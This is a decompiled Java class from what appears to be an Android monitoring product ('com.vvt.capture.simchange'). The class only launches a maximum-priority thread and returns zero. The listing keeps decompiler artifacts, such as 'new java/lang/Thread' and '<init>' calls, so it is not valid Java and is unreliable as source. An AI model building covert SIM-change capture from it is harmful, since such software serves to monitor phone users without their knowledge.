package com.vvt.capture.simchange;

class i
{
  private String b;
  
  public i(g paramg, String paramString)
  {
    this.b = paramString;
  }
  
  public int a()
  {
    Thread localThread = new java/lang/Thread;
    j localj = new com/vvt/capture/simchange/j;
    localj.<init>(this);
    localThread.<init>(localj);
    localThread.setPriority(10);
    localThread.start();
    int i = localThread.getPriority();
    return i - i;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/simchange/i.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */